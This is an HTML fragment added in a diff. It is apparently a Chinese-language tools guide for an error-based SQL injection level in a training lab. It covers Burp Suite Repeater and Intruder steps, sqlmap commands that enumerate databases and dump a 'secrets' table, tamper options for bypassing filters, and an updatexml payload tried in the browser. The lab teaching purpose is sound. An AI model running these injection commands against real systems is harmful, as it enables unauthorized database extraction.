@@ -1,0 +1,41 @@
+<h4>Burp Suite（手工验证首选）</h4>
+<p>适合逐条改 payload、观察报错原文，本关几乎全程用它就够了。</p>
+<pre>
+1. Proxy -> HTTP history 抓到 /modules/sqli/error.php?name=admin
+2. 右键 Send to Repeater，把 name 参数改成报错 payload
+3. Send 后看 Response：报错文本在 HTML 里，形如 XPATH syntax error: '~恭喜你完成本关挑战！'
+4. 需要编码时用 Repeater 里的 Ctrl+U（URL 编码），或右键 Convert selection -> URL-encode
+5. 分段读取时用 Intruder：把 substr 的起始位置设为 payload（Sniper，1..30）
+</pre>
+<p><b>本关解决什么：</b>确认注入点、验证闭合与注释符是否正确、逐段读取被截断的数据。</p>
+
+<h4>sqlmap（自动化）</h4>
+<p>报错注入跑得最快，适合确认"是否有注入"以及直接导出数据。</p>
+<pre>
+# 只跑报错注入，导出通关凭证
+sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E -D bafanglab -T secrets --dump --batch
+
+# 先看有哪些库 / 表
+sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E --dbs --batch
+sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E -D bafanglab --tables --batch
+
+# 常用参数
+# --technique=E   只使用报错注入（B 布尔 / T 时间 / U UNION）
+# --level=3 --risk=2  提高测试覆盖度
+# --tamper=space2comment  空格被过滤时用注释替代空格
+</pre>
+<p><b>本关解决什么：</b>不想手写 substr 分段时，让 sqlmap 自动完成长度探测与分段读取。</p>
+
+<h4>浏览器 DevTools</h4>
+<ul>
+<li>地址栏直接粘贴 payload 就能验证（<code>?name=' or updatexml(...)-- -</code>）。</li>
+<li>F12 &rarr; Network &rarr; 选中该请求 &rarr; Response 查看服务端返回的完整 HTML，报错信息就在里面。</li>
+<li>Ctrl+F 在页面源码里搜 <code>XPATH</code> 或 <code>error</code>，快速定位报错位置。</li>
+</ul>
+<p><b>本关解决什么：</b>零安装快速试 payload、确认错误信息确实被回显。</p>
+
+<h4>辅助工具</h4>
+<ul>
+<li><b>HackBar</b>（浏览器插件）：一键 URL 编码、发送 GET/POST，适合反复试 payload。</li>
+<li><b>sqli-labs</b>：想练更多报错函数（floor、exp、geometrycollection）可本地部署：<a href="https://github.com/skyblueee/sqli-labs-php7" target="_blank" rel="noopener noreferrer">https://github.com/skyblueee/sqli-labs-php7</a></li>
+</ul>
